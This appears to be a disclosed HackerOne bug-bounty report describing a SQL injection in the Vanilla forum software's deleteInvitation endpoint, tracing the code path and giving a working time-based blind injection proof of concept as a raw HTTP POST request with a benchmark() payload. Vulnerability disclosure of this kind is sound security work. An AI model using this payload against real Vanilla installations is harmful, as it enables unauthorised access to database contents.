@@ -1,0 +1,182 @@
+ReportLink:https://hackerone.com/reports/353784
+WeaknessName:SQL Injection
+Reporter:https://hackerone.com/balis0ng
+ReportedTo:Vanilla(vanilla)
+BountyAmount:600.0
+Severity:critical
+State:Closed
+DateOfDisclosure:17.08.2018 6:06:05
+
+Summary:
+
+**Summary:**
+There is a SQL injection vulnerability in the vanilla, an attacker can use this vulnerability to obtain database information.
+**Description:**
+We download the program from https://github.com/vanilla/vanilla and install.
+In applications/dashboard/controllers/class.profilecontroller.php:274
+```php
+public function deleteInvitation($invitationID) {
+        $this->permission('Garden.SignIn.Allow');
+
+        if (!$this->Form->authenticatedPostBack()) {
+            throw forbiddenException('GET');
+        }
+
+        $invitationModel = new InvitationModel();
+        $invitationModel->delete($invitationID);
+        $this->informMessage(t('The invitation was removed successfully.'));
+        $this->jsonTarget(".js-invitation[data-id=\"{$invitationID}\"]", '', 'SlideUp');
+
+        $this->render('Blank', 'Utility');
+    }
+```
+The value of this $invitationID is controllable by us. It is worth noting: it can be an array。
+You can see that the value of $invitationID was brought into the delete function.
+applications/dashboard/models/class.invitationmodel.php:225
+```php
+    public function delete($where = [], $options = []) {
+        if (is_numeric($where)) {
+            deprecated('InvitationModel->delete(int)', 'InvitationModel->deleteID(int)');
+            $result = $this->deleteID($where, $options);
+            return $result;
+        }
+        parent::delete($where, $options);
+    }
+```
+The $where parameter of this function is controllable by us. It was brought into the delete function and we traced it.
+```php
+ public function delete($where = [], $options = []) {
+        if (is_numeric($where)) {
+            deprecated('Gdn_Model->delete(int)', 'Gdn_Model->deleteID()');
+            $where = [$this->PrimaryKey => $where];
+        }
+
+        $resetData = false;
+        if ($options === true || val('reset', $options)) {
+            deprecated('Gdn_Model->delete() with reset true');
+            $resetData = true;
+        } elseif (is_numeric($options)) {
+            deprecated('The $limit parameter is deprecated in Gdn_Model->delete(). Use the limit option.');
+            $limit = $options;
+        } else {
+            $options += ['rest' => true, 'limit' => null];
+            $limit = $options['limit'];
+        }
+
+        if ($resetData) {
+            $result = $this->SQL->delete($this->Name, $where, $limit);
+        } else {
+            $result = $this->SQL->noReset()->delete($this->Name, $where, $limit);
+        }
+        return $result;
+    }
+```
+The $where parameter was brought into $result = $this->SQL->noReset()->delete($this->Name, $where, $limit);
+traced it:
+library/database/class.sqldriver.php:333
+```php
+    public function delete($table = '', $where = '', $limit = false) {
+        if ($table == '') {
+            if (!isset($this->_Froms[0])) {
+                return false;
+            }
+
+            $table = $this->_Froms[0];
+        } elseif (is_array($table)) {
+            foreach ($table as $t) {
+                $this->delete($t, $where, $limit, false);
+            }
+            return;
+        } else {
+            $table = $this->escapeIdentifier($this->Database->DatabasePrefix.$table);
+        }
+
+        if ($where != '') {
+            $this->where($where);
+        }
+
+        if ($limit !== false) {
+            $this->limit($limit);
+        }
+
+        if (count($this->_Wheres) == 0) {
+            return false;
+        }
+
+        $sql = $this->getDelete($table, $this->_Wheres, $this->_Limit);
+
+        return $this->query($sql, 'delete');
+    }
+```
+The $where parameter was brought into $this->where function
+```php
+   public function where($field, $value = null, $escapeFieldSql = true, $escapeValueSql = true) {
+        if (!is_array($field)) {
+            $field = [$field => $value];
+        }
+
+        foreach ($field as $subField => $subValue) {
+            if (is_array($subValue)) {
+                if (count($subValue) == 1) {
+                    $firstVal = reset($subValue);
+                    $this->where($subField, $firstVal);
+                } else {
+                    $this->whereIn($subField, $subValue);
+                }
+            } else {
+                $whereExpr = $this->conditionExpr($subField, $subValue, $escapeFieldSql, $escapeValueSql);
+                if (strlen($whereExpr) > 0) {
+                    $this->_where($whereExpr);
+                }
+            }
+        }
+        return $this;
+    }
+```
+As mentioned above, the value of $where is controllable by us and can be an array.
+This means that we can control the field name in the where statement.
+So we can fill in the field name in the SQL injection statement.
+Follow-up operation will not say much.
+## Steps to reproduce:
+1.The exploit requires users to log in. We can log in as an ordinary user.
+2.The POST method is required to access the deleteInvitation function. Due to the existence of the TransientKey, we cannot directly send a POST request.But we can get TransientKey by other means. For example, grab a normal POST message and change it to a vulnerability URL.
+3.Here I use delay injection, using the benchmark function in mysql. Different environment delay time is not the same.
+##The poc:
+```
+POST /profile/deleteInvitation?invitationID[1%3dbenchmark(40000000,sha(1))+and+1]=balisong HTTP/1.1
+Host: localhost
+Content-Length: 29
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://localhost
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Referer: http://localhost/profile/
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: Drupal.toolbar.collapsed=0; hd_sid=udVsUw; XDEBUG_SESSION=PHPSTORM; Vanilla=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MjkyMDE2NTAsImlhdCI6MTUyNjYwOTY1MCwic3ViIjo3fQ.of1gk2CHyzeomQNSMWz_8WXXi_FfCwKxyctVWZlemKI; Vanilla-Vv=1526609650; Vanilla-tk=caEyM0dSVZC0xDhU%3A7%3A1526609650%3Ab23a6efff2dd9f026ffa87db10ba4119
+Connection: close
+
+TransientKey=caEyM0dSVZC0xDhU
+
+```
+Delayed 9s on my own machine。
+as the picture shows:
+F298931
+## Anything else we should know?
+
+## Impact
+
+an attacker can use this vulnerability to obtain database information.
+
+The hacker selected the **SQL Injection** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:
+
+**Verified**
+Yes
+
+**What exploitation technique did you utilize?**
+Time delay
+
+**Please describe the results of your verification attempt.**
+observed a 9+ second time delay
